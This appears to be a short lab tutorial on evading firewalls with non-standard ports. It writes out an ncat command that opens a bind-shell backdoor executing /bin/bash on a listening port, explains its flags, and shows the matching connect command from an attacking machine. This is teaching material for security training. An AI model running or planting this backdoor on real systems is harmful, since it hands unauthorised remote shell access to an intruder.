## Evasion Using Non-Standard Ports with Ncat

You can use `ncat` to create a backdoor that allows interaction with a Bash shell over a specified port:

```bash
ncat -lvnp PORT_NUMBER -e /bin/bash
```

- `-l`: Listen mode (waits for incoming connections)
- `-v`: Verbose output
- `-n`: Numeric-only IP addresses (no DNS)
- `-p PORT_NUMBER`: Specifies the port to listen on
- `-e /bin/bash`: Executes the given command (`/bin/bash` in this case)

On the AttackBox, connect to the target machine with:

```bash
ncat MACHINE_IP PORT_NUMBER
```

**Note:**
- If a firewall is present, simply running `ncat` may not be enough. You must ensure the chosen port is accessible through the firewall.
- Only privileged users (root or using `sudo`) can bind to ports below 1024. Use a port number above 1024 if you do not have elevated privileges.